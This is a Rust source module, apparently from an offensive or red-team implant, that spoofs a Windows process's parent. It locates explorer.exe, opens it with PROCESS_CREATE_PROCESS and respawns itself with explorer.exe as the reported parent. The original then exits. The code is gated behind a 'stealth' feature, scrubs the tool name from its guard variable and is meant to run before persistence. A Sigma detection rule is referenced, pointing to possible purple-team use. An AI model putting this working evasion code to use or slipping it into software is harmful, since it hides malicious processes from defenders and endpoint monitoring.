//! PPID spoofing: spawn copy of self with explorer.exe as reported parent.
//!
//! On first run: find explorer.exe PID via sysinfo, open it with
//! PROCESS_CREATE_PROCESS, spawn copy using PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
//! exit. Child continues with explorer.exe as parent in process tree.
//!
//! Guard: __OXIDE_INIT env var prevents child from spoofing again.
//!
//! Detection: detection/sigma/stealth_ppid_mismatch.yml.

const GUARD_VAR: &str = "__PROC_INIT";

/// Spoof parent to explorer.exe on first run. No-op if guard var is set.
/// Call early in main(), before persistence. May exit current process.
///
/// # Safety
/// Calls CreateProcessW and may call std::process::exit(0).
#[cfg(all(target_os = "windows", feature = "stealth"))]
pub unsafe fn spoof_if_needed() {
    if std::env::var(GUARD_VAR).is_ok() {
        return;
    }
    let pid = match find_explorer_pid() {
        Some(p) => p,
        None => {
            dbg_log!("[!] ppid: explorer.exe not found, skipping");
            return;
        }
    };
    match spawn_with_parent(pid) {
        Ok(()) => std::process::exit(0),
        Err(_e) => {
            dbg_log!("[!] ppid: spawn failed: {_e}, continuing without spoof");
        }
    }
}

#[cfg(all(target_os = "windows", feature = "stealth"))]
fn find_explorer_pid() -> Option<u32> {
    use sysinfo::{ProcessesToUpdate, System};
    let mut sys = System::new();
    sys.refresh_processes(ProcessesToUpdate::All, true);
    let pid = sys
        .processes_by_exact_name("explorer.exe".as_ref())
        .next()
        .map(|p| p.pid().as_u32());
    pid
}

#[cfg(all(target_os = "windows", feature = "stealth"))]
fn spawn_with_parent(parent_pid: u32) -> anyhow::Result<()> {
    use std::os::windows::ffi::OsStrExt;
    use windows::{
        core::PWSTR,
        Win32::Foundation::{CloseHandle, HANDLE},
        Win32::System::Threading::{
            CreateProcessW, DeleteProcThreadAttributeList,
            InitializeProcThreadAttributeList, OpenProcess,
            UpdateProcThreadAttribute, EXTENDED_STARTUPINFO_PRESENT,
            LPPROC_THREAD_ATTRIBUTE_LIST, PROCESS_CREATE_PROCESS,
            PROCESS_INFORMATION, STARTUPINFOEXW,
        },
    };

    let exe = std::env::current_exe()?;
    let mut cmd: Vec<u16> = exe.as_os_str()
        .encode_wide()
        .chain(std::iter::once(0u16))
        .collect();

    unsafe {
        let parent = OpenProcess(PROCESS_CREATE_PROCESS, false, parent_pid)?;

        struct HGuard(HANDLE);
        impl Drop for HGuard {
            fn drop(&mut self) {
                unsafe {
                    let _ = CloseHandle(self.0);
                }
            }
        }
        let _pg = HGuard(parent);

        struct AttrListGuard(LPPROC_THREAD_ATTRIBUTE_LIST);
        impl Drop for AttrListGuard {
            fn drop(&mut self) {
                unsafe { DeleteProcThreadAttributeList(self.0); }
            }
        }

        // First call: probe required buffer size.
        let mut attr_size: usize = 0;
        let _ = InitializeProcThreadAttributeList(
            LPPROC_THREAD_ATTRIBUTE_LIST(std::ptr::null_mut()),
            1,
            0,
            &mut attr_size,
        );
        let mut attr_buf = vec![0u8; attr_size];
        let attr_list = LPPROC_THREAD_ATTRIBUTE_LIST(
            attr_buf.as_mut_ptr() as *mut core::ffi::c_void,
        );
        InitializeProcThreadAttributeList(attr_list, 1, 0, &mut attr_size)?;
        let _ag = AttrListGuard(attr_list);

        // Set PROC_THREAD_ATTRIBUTE_PARENT_PROCESS.
        UpdateProcThreadAttribute(
            attr_list,
            0,
            windows::Win32::System::Threading::PROC_THREAD_ATTRIBUTE_PARENT_PROCESS as usize,
            Some(&parent as *const HANDLE as *const core::ffi::c_void),
            core::mem::size_of::<HANDLE>(),
            None,
            None,
        )?;

        let mut si = STARTUPINFOEXW::default();
        si.StartupInfo.cb = core::mem::size_of::<STARTUPINFOEXW>() as u32;
        si.lpAttributeList = attr_list;

        let mut pi = PROCESS_INFORMATION::default();

        // Set guard var just before spawn — child inherits from parent's environment.
        std::env::set_var(GUARD_VAR, "1");
        let create_result = CreateProcessW(
            None,
            PWSTR(cmd.as_mut_ptr()),
            None,
            None,
            false,
            EXTENDED_STARTUPINFO_PRESENT,
            None,
            None,
            &si as *const STARTUPINFOEXW as *const windows::Win32::System::Threading::STARTUPINFOW,
            &mut pi,
        );
        if create_result.is_err() {
            std::env::remove_var(GUARD_VAR);
            create_result?;
        }

        let _ = CloseHandle(pi.hProcess);
        let _ = CloseHandle(pi.hThread);
    }
    Ok(())
}

// No-op stub for non-Windows/non-stealth.
#[cfg(not(all(target_os = "windows", feature = "stealth")))]
pub unsafe fn spoof_if_needed() {}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn guard_var_has_no_toolname() {
        assert!(!GUARD_VAR.is_empty());
        assert!(!GUARD_VAR.to_lowercase().contains("oxide"));
    }

    #[test]
    fn compiles_on_host() {}
}
